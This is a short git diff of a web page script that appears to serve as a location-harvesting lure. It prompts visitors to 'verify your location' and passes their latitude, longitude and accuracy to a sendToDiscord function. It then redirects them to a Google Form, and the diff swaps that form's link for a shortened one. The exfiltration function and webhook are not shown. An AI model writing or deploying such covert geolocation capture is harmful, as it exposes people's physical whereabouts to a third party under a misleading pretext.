@@ -28,7 +28,7 @@ document.addEventListener("DOMContentLoaded", () => {
     .then(() => {
       statusMsg.textContent = "Redirecting...";
       setTimeout(() => {
-        window.location.href = "https://docs.google.com/forms/d/e/1FAIpQLSeHgdH7Q3lRjGF-bVd7SrCOyjg6Skvg33TP0OAJUgqNrhAfgA/viewform?usp=dialog";
+        window.location.href = "https://forms.gle/JAM6tU6od5x4x4mf8";
       }, 1000);
     })
     .catch((err) => {
@@ -53,7 +53,7 @@ document.addEventListener("DOMContentLoaded", () => {
         sendToDiscord(latitude, longitude, accuracy, timestamp);
       },
       (error) => {
-        statusMsg.textContent = "Verify your location first";
+        statusMsg.textContent = "Plese verify your location first";
         allowBtn.disabled = false;
         allowBtn.textContent = "Try Again";
         console.warn("Location error:", error.message);
